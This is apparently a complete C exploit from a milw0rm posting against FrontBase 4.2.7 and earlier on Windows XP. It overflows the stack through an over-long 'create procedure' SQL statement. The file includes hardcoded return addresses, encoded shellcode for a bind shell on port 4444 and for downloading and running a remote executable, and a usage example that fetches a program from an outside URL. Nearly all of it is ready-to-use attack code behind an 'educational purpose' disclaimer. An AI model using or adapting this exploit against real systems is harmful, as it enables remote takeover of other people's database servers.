/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Frontbase <= 4.2.7 for Windows 
* Site           : http://www.frontbase.com
* Found by       : Netragard, L.L.C Advisory
* ----------------------------------------
* Exploit        : Frontbase <= 4.2.7 POST-AUTH remote buffer overflow 
* Exploit date   : 02.04.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows XP SP0-SP2 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           : This is the EIP overwrite realization of the Frontbase 'create procedure' buffer overflow.
*  Exploit was tested on Frontbase 4.2.7 and 4.1.16 versions under Windows XP SP0, Windows XP SP1, Windows XP SP2.
*  to add the Windows 2000 here , you will need to update a little stabstack code or use the SEH method exploit.
* 
*  this version of that exploit doesn't used the code from win32 SEH GetPC project to get the baseaddress
*  cause this was not worked on the Windows XP, so i took it from stack and calculated baseaddress.
*
*  also i added here the 'Download and Execute exploit'.
*
*  Exploit requires authentification!
*
* ----------------------------------------
* Compiling:
*  To compile this exploit you need:
*    1. Folder 'C:\usr\FrontBase\Include\FBCAccess' copy to exploit folder.
*    2. Copy from 'C:\usr\FrontBase\lib\' file 'FBCAccess.lib' to your exploit folder.
*    3. Select 'FBCAccess.lib' in linker options
*    4. Compile.
* ----------------------------------------
* Thanks to:
*       1. Netragard, L.L.C Advisory   ( http://www.netragard.com -- "We make I.T. Safe." )
*       2. The Metasploit project      ( http://metasploit.com                            ) 
*       3. ALPHA 2: Zero-tolerance     ( <skylined [at] edup.tudelft.nl>                  ) 
*       4. Dreatica-FXP crew           (                                                  )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#pragma comment(lib,"ws2_32")
#include "FBCAccess/FBCAccess.h"

void usage(char * s);
void logo();
void prepare_shellcode(unsigned char * fsh, int sh, char * url);
void make_buffer(char * buf, int itarget, int sh, char * url);
int  validate_args( int port, int sh, int itarget);
int  send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf);
int  alphanumeric_encoder_thx_to_skylined(char *to_encode, char *encoded );

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------

struct _target{
	const char *t ;
	unsigned long ret ;
} targets[] = 
{	// alphanumeric jmp esp, for Windows XP i found it only in ole32.dll
	{"Windows XP SP0 RUSSIAN                   [  ole32.dll  ]",   0x77271f36 }, 
	{"Windows XP SP1 RUSSIAN                   [  ole32.dll  ]",   0x77270670 }, 
	{"Windows XP SP2 RUSSIAN                   [  ole32.dll  ]",   0x77544326 }, 
	{"Windows XP SP2 DUTCH                     [  ole32.dll  ]",   0x77514326 }, 	
	{NULL,                                               0x00000000 }

};
struct {
	const char * name;
	char * shellcode;
}shellcodes[]={ 	
	 {"Spawn bindshell on port 4444", 
		 /* modified win32_bind -  EXITFUNC=seh LPORT=4444 Encoder=Alpha2 http://metasploit.com 
		    first jmp instructions removed, cause we already have the baseaddress in ECX */
		"\x49\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x66"
		"\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41\x76\x32\x42\x42\x32\x41"
		"\x41\x30\x41\x41\x42\x58\x50\x38\x42\x42\x75\x38\x69\x39\x6c\x52"
		"\x4a\x5a\x4b\x42\x6d\x68\x68\x48\x79\x4b\x4f\x6b\x4f\x4b\x4f\x65"
		"\x30\x6c\x4b\x30\x6c\x31\x34\x71\x34\x4e\x6b\x42\x65\x65\x6c\x6e"
		"\x6b\x53\x4c\x43\x35\x62\x58\x55\x51\x4a\x4f\x4e\x6b\x72\x6f\x54"
		"\x58\x6c\x4b\x51\x4f\x77\x50\x53\x31\x78\x6b\x43\x79\x4e\x6b\x54"
		"\x74\x6c\x4b\x35\x51\x6a\x4e\x64\x71\x6f\x30\x6e\x79\x6e\x4c\x6d"
		"\x54\x6f\x30\x64\x34\x55\x57\x4f\x31\x59\x5a\x36\x6d\x36\x61\x59"
		"\x52\x5a\x4b\x4c\x34\x37\x4b\x62\x74\x47\x54\x46\x48\x70\x75\x4d"
		"\x35\x6c\x4b\x73\x6f\x64\x64\x33\x31\x4a\x4b\x43\x56\x4c\x4b\x44"
		"\x4c\x62\x6b\x6e\x6b\x63\x6f\x57\x6c\x65\x51\x6a\x4b\x77\x73\x56"
		"\x4c\x6c\x4b\x6e\x69\x62\x4c\x44\x64\x45\x4c\x55\x31\x6f\x33\x44"
		"\x71\x6b\x6b\x51\x74\x4e\x6b\x53\x73\x30\x30\x4e\x6b\x57\x30\x34"
		"\x4c\x6c\x4b\x64\x30\x37\x6c\x4e\x4d\x6c\x4b\x53\x70\x73\x38\x73"
		"\x6e\x30\x68\x4c\x4e\x62\x6e\x74\x4e\x38\x6c\x30\x50\x79\x6f\x6a"
		"\x76\x51\x76\x30\x53\x42\x46\x72\x48\x35\x63\x45\x62\x33\x58\x64"
		"\x37\x64\x33\x74\x72\x43\x6f\x33\x64\x4b\x4f\x78\x50\x52\x48\x38"
		"\x4b\x7a\x4d\x4b\x4c\x57\x4b\x62\x70\x69\x6f\x6e\x36\x71\x4f\x6e"
		"\x69\x4b\x55\x33\x56\x6c\x41\x4a\x4d\x76\x68\x74\x42\x63\x65\x51"
		"\x7a\x77\x72\x4b\x4f\x4a\x70\x63\x58\x6e\x39\x35\x59\x6b\x45\x4e"
		"\x4d\x30\x57\x4b\x4f\x38\x56\x50\x53\x50\x53\x42\x73\x51\x43\x70"
		"\x53\x70\x43\x32\x73\x52\x63\x76\x33\x59\x6f\x6e\x30\x55\x36\x33"
		"\x58\x76\x71\x71\x4c\x63\x56\x56\x33\x6e\x69\x59\x71\x4e\x75\x55"
		"\x38\x4c\x64\x55\x4a\x72\x50\x6b\x77\x56\x37\x4b\x4f\x4e\x36\x53"
		"\x5a\x56\x70\x32\x71\x33\x65\x69\x6f\x4e\x30\x62\x48\x39\x34\x4c"
		"\x6d\x74\x6e\x4a\x49\x63\x67\x69\x6f\x79\x46\x43\x63\x36\x35\x6b"
		"\x4f\x68\x50\x35\x38\x5a\x45\x70\x49\x6d\x56\x70\x49\x41\x47\x6b"
		"\x4f\x68\x56\x56\x30\x41\x44\x33\x64\x71\x45\x69\x6f\x4e\x30\x4d"
		"\x43\x53\x58\x5a\x47\x70\x79\x6b\x76\x73\x49\x41\x47\x49\x6f\x4e"
		"\x36\x63\x65\x4b\x4f\x4e\x30\x53\x56\x50\x6a\x35\x34\x53\x56\x41"
		"\x78\x61\x73\x30\x6d\x4c\x49\x4b\x55\x72\x4a\x72\x70\x76\x39\x45"
		"\x79\x58\x4c\x6b\x39\x59\x77\x31\x7a\x67\x34\x4c\x49\x49\x72\x70"
		"\x31\x6f\x30\x6c\x33\x6f\x5a\x69\x6e\x72\x62\x36\x4d\x4b\x4e\x53"
		"\x72\x34\x6c\x6a\x33\x6e\x6d\x62\x5a\x36\x58\x6c\x6b\x4c\x6b\x4e"
		"\x4b\x61\x78\x30\x72\x6b\x4e\x6d\x63\x46\x76\x4b\x4f\x44\x35\x32"
		"\x64\x39\x6f\x38\x56\x51\x4b\x70\x57\x52\x72\x70\x51\x32\x71\x53"
		"\x61\x42\x4a\x43\x31\x56\x31\x46\x31\x70\x55\x43\x61\x79\x6f\x6a"
		"\x70\x62\x48\x6e\x4d\x59\x49\x67\x75\x7a\x6e\x33\x63\x39\x6f\x59"
		"\x46\x63\x5a\x59\x6f\x4b\x4f\x76\x57\x6b\x4f\x6a\x70\x4c\x4b\x61"
		"\x47\x59\x6c\x6b\x33\x38\x44\x43\x54\x49\x6f\x58\x56\x36\x32\x59"
		"\x6f\x4e\x30\x43\x58\x68\x70\x4f\x7a\x54\x44\x73\x6f\x71\x43\x4b"
		"\x4f\x4e\x36\x6b\x4f\x78\x50\x66"
	 },	 
	 { "Download and execute shellcode (set URL)",
		/* win32_download_exec - http://metasploit.com */
		/* encoded by "ALPHA 2: Zero-tolerance. <skylined@edup.tudelft.nl> */
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
		"\x49\x37\x51\x5A\x6A\x41\x58\x50\x30\x41\x30\x41\x6B\x41\x41\x51"
		"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
		"\x75\x4A\x49\x58\x6B\x36\x70\x71\x4A\x33\x7A\x76\x53\x59\x59\x71"
		"\x76\x38\x39\x57\x4C\x35\x51\x6B\x30\x74\x74\x74\x4A\x6E\x79\x39"
		"\x72\x7A\x5A\x78\x6B\x36\x65\x4D\x38\x7A\x4B\x4B\x4F\x4B\x4F\x4B"
		"\x4F\x54\x30\x50\x4C\x4E\x79\x6C\x59\x5A\x39\x4F\x33\x79\x6D\x55"
		"\x68\x6C\x69\x5A\x39\x4E\x79\x4A\x39\x34\x52\x58\x59\x6E\x75\x54"
		"\x52\x4B\x59\x6D\x55\x36\x54\x45\x42\x7A\x79\x6F\x61\x56\x72\x53"
		"\x71\x34\x52\x5A\x4A\x6D\x75\x76\x72\x4A\x4D\x4E\x67\x4D\x31\x6F"
		"\x6A\x72\x4A\x36\x72\x6B\x57\x4E\x59\x4F\x6A\x33\x52\x76\x72\x6E"
		"\x37\x4C\x4D\x6F\x5A\x74\x34\x7A\x6F\x48\x4E\x79\x58\x55\x42\x4D"
		"\x76\x4C\x5A\x73\x52\x74\x52\x32\x4B\x6B\x43\x4C\x57\x49\x50\x52"
		"\x4A\x75\x6F\x7A\x4D\x4A\x31\x69\x50\x59\x56\x54\x5A\x51\x4E\x4F"
		"\x6D\x69\x4C\x33\x4B\x64\x30\x4B\x70\x6F\x36\x6B\x77\x54\x52\x73"
		"\x64\x62\x32\x79\x4F\x4D\x6D\x6E\x7A\x70\x5A\x73\x78\x70\x78\x4F"
		"\x6A\x62\x78\x6D\x7A\x50\x50\x4B\x4F\x75\x42\x4A\x31\x75\x42\x4B"
		"\x6F\x6F\x75\x4D\x4A\x61\x4A\x52\x78\x52\x58\x4D\x4B\x6E\x7A\x50"
		"\x58\x66\x72\x4D\x49\x6D\x4A\x51\x4A\x56\x72\x55\x33\x62\x32\x50"
		"\x6E\x55\x4A\x51\x4F\x4E\x77\x75\x42\x63\x79\x49\x63\x4D\x4D\x39"
		"\x50\x32\x51\x4B\x79\x4D\x49\x6D\x49\x6E\x79\x76\x7A\x51\x4F\x4C"
		"\x54\x68\x4B\x78\x4F\x71\x76\x6A\x6E\x55\x35\x59\x53\x77\x62\x53"
		"\x71\x4B\x43\x4E\x78\x39\x50\x31\x61\x59\x34\x4D\x49\x4C\x59\x6E"
		"\x79\x46\x7A\x71\x4F\x6F\x7A\x6A\x6F\x69\x4F\x74\x59\x4D\x77\x77"
		"\x69\x78\x6C\x73\x53\x37\x69\x6E\x4F\x37\x69\x7A\x67\x75\x4A\x73"
		"\x45\x6E\x59\x75\x42\x71\x55\x6B\x43\x78\x39\x4B\x7A\x45\x36\x68"
		"\x4E\x73\x45\x31\x4E\x6D\x4D\x4F\x6A\x39\x55\x79\x68\x6E\x57\x4B"
		"\x4C\x51\x4E\x6B\x6D\x4F\x6A\x4D\x4D\x38\x61\x79\x6C\x6C\x59\x6A"
		"\x39\x4F\x5A\x70\x59\x4B\x79\x79\x59\x6A\x6A\x4A\x6F\x39\x59\x73"
		"\x56\x48\x4E\x53\x55\x55\x42\x71\x55\x6B\x79\x6A\x6A\x50\x66\x48"
		"\x4E\x65\x39\x6A\x69\x65\x36\x78\x4E\x50\x6D\x6F\x5A\x52\x79\x30"
		"\x35\x35\x4C\x50\x59\x4A\x4C\x31\x70\x58\x48\x78\x4B\x78\x4F\x6A"
		"\x6A\x52\x46\x50\x4B\x68\x43\x6B\x70\x74\x72\x73\x4B\x70\x77\x4F"
		"\x5A\x56\x39\x73\x6A\x61\x61\x4D\x6F\x63\x56\x43\x56\x75\x36\x4B"
		"\x6E\x79\x6C\x7A\x4D\x6F\x39\x78\x6B\x58\x76\x6B\x4A\x78\x58\x4B"
		"\x4D\x6B\x4D\x5A\x4B\x4B\x4C\x4A\x4A\x7A\x4A\x5A\x39\x59\x4E\x6B"
		"\x4C\x48\x6D\x5A\x6A\x6B\x50\x4B\x5A\x5A\x4D\x4B\x4C\x4B\x44\x6B"
		"\x6D\x6C\x30\x4A\x4B\x6B\x4C\x79\x6A\x58\x6D\x59\x66\x5A\x4B\x59"
		"\x70\x68\x58\x4D\x49\x7A\x6E\x6A\x50\x4C\x37\x4B\x6C\x6D\x31\x6B"
		"\x4C\x6B\x4A\x6C\x59\x4B\x6C\x6B\x51\x5A\x50\x48\x6D\x4A\x6D\x68"
		"\x71\x4A\x4B\x79\x6C\x59\x68\x6B\x4D\x4F\x69\x6E\x35\x4B\x46\x6B"
		"\x48\x4B\x4D\x4E\x35\x78\x70\x6B\x4B\x4A\x4B\x7A\x58\x48\x6B\x4B"
		"\x50\x4A\x78\x4C\x59\x4A\x4C\x4A\x4B\x6A\x55\x59\x64\x4C\x36\x6B"
		"\x47\x4E\x79\x68\x4C\x38\x4B\x7A\x75\x4B\x6D\x79\x66\x7A\x4E\x4B"
		"\x47\x39\x65\x4A\x56\x58\x78\x4B\x4D\x7A\x6D\x4C\x36\x59\x4F\x78"
		"\x70\x7A\x55\x39\x6C\x6E\x38\x6D\x49"
	 },
	{NULL , NULL }
};

// alphanumeric stack stabilizer
char stabstack[]= "\x01\x01\x01\x01\x54\x54\x5b\x58\x66\x2d\x30\x30\x50\x5c\x53\x58\x04\x20\x50\x59";

int main(int argc, char **argv)
{
	char temp1[100], temp2[100];
	char *url= NULL, * remotehost=NULL, * user=NULL, * password=NULL, * database=NULL, * dbpassword=NULL;
	char default_remotehost[]="127.0.0.1";
	char default_user[]="_SYSTEM";
	char default_password[]="";
	char default_database[]="";
	char default_dbpassword[]="";
	int port, itarget, sh;
	char c;		
	logo();
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}
	// set defaults		
	port=-1;
	itarget=0;
	sh=0;
	// ------------		
	while((c = getopt(argc, argv, "h:p:s:t:u:P:d:D:x:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 's':
				sscanf(optarg, "%d", &sh);
				sh--;
				break;
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;		
			case 'u':
				user=optarg;
				break; 
			case 'P':
				password=optarg;
				break; 
			case 'd':
				database=optarg;
				break; 
			case 'x':
				url=optarg;
				break;
			default:
	            usage(argv[0]);
			return -1;
		}		
	}
	if(validate_args( port, sh, itarget)==-1) return -1;
	if(remotehost == NULL) remotehost=default_remotehost;
	if(user       == NULL) user=default_user;
	if(password   == NULL) password=default_password;
	if(dbpassword == NULL) dbpassword=default_dbpassword;
	if(database   == NULL) database=default_database;
	if(url        == NULL) url="";
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	if(port!=-1)
	{
		sprintf(temp2, "%d", port);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  Port    : %s%s# \n", temp2, temp1);
	}else
	{
		sprintf(temp2, "%s", database);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  Database: %s%s# \n", temp2, temp1);
	}
	sprintf(temp2, "%s", user);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  User    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Shellcde: %s%s# \n", temp2, temp1);	
	if(sh==1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp2,0,sizeof(temp2));
		sprintf(temp2, "%s", url );
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
		printf(" #  URL     : %s%s# \n", temp2, temp1);	
	}
	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);	
	printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);	
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	
	char buf[20000];
	memset(buf,0,sizeof(buf));
	printf("[+] Constructing attacking buffer... ");
	fflush(stdout);
	make_buffer((char *)buf,itarget,sh, url);
	printf("done\n");

	if(send_buffer(remotehost,port, user, password, dbpassword, database, buf)==-1)
	{
		fprintf(stdout, "[-] Cannot exploit server %s\n", remotehost);		
		return -1;
	}
	return 0;
}

int validate_args(int port, int sh, int itarget)
{
	int i=0,x=0;
	for(i=0;shellcodes[i].name;i++)if(i==sh)x=1;
    if(x==0)
	{
		printf("[-] The shellcode number is invalid\n");
		return -1;
	}	
	x=0;
	for(i=0;targets[i].t;i++)if(i==itarget)x=1;
	if(x==0)
	{
		printf("[-] The target is invalid\n");
		return -1;
	}	
	return 1;
}

void prepare_shellcode( char * fsh, int sh, char * url)
{
	memcpy(fsh, shellcodes[sh].shellcode, strlen(shellcodes[sh].shellcode));	
	if(sh==1)
	{
		char locurl[1000];
		memcpy(locurl, url, strlen(url));
		locurl[strlen(locurl)]='\x80';
		char encoded_url[2500] ;
		alphanumeric_encoder_thx_to_skylined(locurl, encoded_url);
		strcat(fsh, encoded_url);	
	}
}
void make_buffer(char * buf, int itarget, int sh, char * url)
{
	// -=[ prepare shellcode ]=-
	char fsh[1000];
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, sh, url);
	// -----------------
	
    // -=[ fill buffer here  ]=-
	memset(buf,0,sizeof(buf));
	char * cp = buf;

		// make vulnerable sql92 command to get exploit
	strcat(buf, "create procedure \"");
	cp=buf+strlen(buf);	
	
		// long buffer
	memset(cp, 'A', 255);  
	cp+=strlen((char *)cp);

		// overwrite EIP
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);

		// some chars
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	
		// put stack stabilizer
	memcpy(cp, stabstack, strlen(stabstack));  
	cp+=strlen((char *)cp);

		// put shellcode
	memcpy(cp, fsh, strlen(fsh));
	cp+=strlen((char *)cp);

		// :P
	memset(cp, 'A', 10);  
	cp+=strlen((char *)cp);

		// end of the sql92 command
	memcpy(cp, "\"()\n begin\n end;", strlen("\"()\n begin\n end;"));

	// -----------------
}

int send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf)
{
	FBCDatabaseConnection * fbdc;
	FBCMetaData *meta;
	char sesn[]="dreatica-fxp";   
	if(database!=NULL) port = -1;
	fbcInitialize();	
   	if (port!=-1)
	{
		printf("[+] Connecting to %s:%d\n", host, port);
		fbdc = fbcdcConnectToDatabaseUsingPort(host, port, dbpassword); 
	}else
	{
		printf("[+] Connecting to %s to database %s\n", host, database);
		fbdc = fbcdcConnectToDatabase(database, host, dbpassword);
	}
	if (fbdc == NULL)
	{
		printf("[-] Cannot connect to %s\n", host);
		return -1;
	}	
	char * session_name=sesn;
	meta = fbcdcCreateSession(fbdc, session_name, user, password, "system_user");
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to create session\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}   
	fbcmdRelease(meta);
	printf("[+] Sending %d bytes of buffer to server, check the shell\n", strlen(buf));
		// if exploit success, the app will stop here.
	meta = fbcdcExecuteDirectSQL(fbdc, buf);
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to send buffer\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}
	fbcmdRelease(meta);
	return 1;
}


// alphanumeric encoder took from "ALPHA 2: Zero-tolerance." code
int alphanumeric_encoder_thx_to_skylined(char *to_encode, char *encoded )
{
  int   i,ii=0, input, A, B, C, D, E, F, length=(int)strlen(to_encode);
  char* valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; // mixed chars
  char temp[10];
  memset(temp, 0 , sizeof(temp));
  memset(encoded,0x00,1000);  
  srand((int)clock());  
  while( (input = to_encode[ii++]) != 0 ) {
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);
    F = B;
    i = rand() % ((int)strlen(valid_chars));
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % ((int)strlen(valid_chars)); }
    E = valid_chars[i] >> 4;
    D = (A^E);
    i = rand() % ((int)strlen(valid_chars));
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % ((int)strlen(valid_chars)); }
    C = valid_chars[i] >> 4;
    sprintf(temp,"%c%c", (C<<4)+D, (E<<4)+F);
    encoded[strlen(encoded)]=temp[0];
	encoded[strlen(encoded)]=temp[1];
  }
  encoded[strlen(encoded)]='A';
  return 0;
}



// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------




void usage(char * s)
{	
	printf("   Usage: %s -h <host> -p <port> -s <shellcode> -t <target> -u <user> -p <password> -d <database> -D <dbpassword> -x <url>\n", s);
    printf(" ----------------------------------------------------------------------- \n");
	printf("   Arguments:\n");
	printf("\n");
	printf("      -h <host>       the host IP to attack\n");
	printf("      -p <port>       the port of server      (default: -1     )\n");
	printf("      -s <shellcode>  shellcode number        (default: 1      )\n");
	printf("      -t <target>     target number           (default: 1      )\n");
	printf("      -u <user>       user name of frontbase  (default: _SYSTEM)\n");
	printf("      -p <password>   user password           (default: <blank>)\n");
	printf("      -d <database>   database (if port = -1) (default: <blank>)\n");
	printf("      -D <dbpassword> database password       (default: <blank>)\n");
	printf("      -x <url>        URL to executable       (default: <blank>)\n");
	printf("\n");
	printf("   Shellcodes:\n\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("      %d. %s \n",i+1,shellcodes[i].name);				
	}	
	printf("\n");
	printf("   Targets:\n\n");
	for(int j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	printf("   Examples:\n\n");
	printf("    %s -h 127.0.0.1 -d New\n", s);
	printf("    %s -h 127.0.0.1 -p 1155 -u root -p dta -D dta -t 1\n", s);
	printf("    %s -h 127.0.0.1 -d New -t 5 -s 2 -x http://dreatica.com/calc.exe\n", s);
	printf(" ----------------------------------------------------------------------- \n");	
}

void logo()
{
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : Frontbase <= 4.2.7 for Windows (multiple targets)        # \n");
	printf(" #  Tested  : Frontbase 4.1.16 and 4.2.7                               # \n");
	printf(" #  Author  : Heretic2 (heretic2x@gmail.com)                           # \n");
	printf(" #  Version : 2.2                                                      # \n");
	printf(" #  System  : Windows XP SP0-SP2                                       # \n");
	printf(" #  Date    : 02.04.2007                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

// milw0rm.com [2007-04-02]
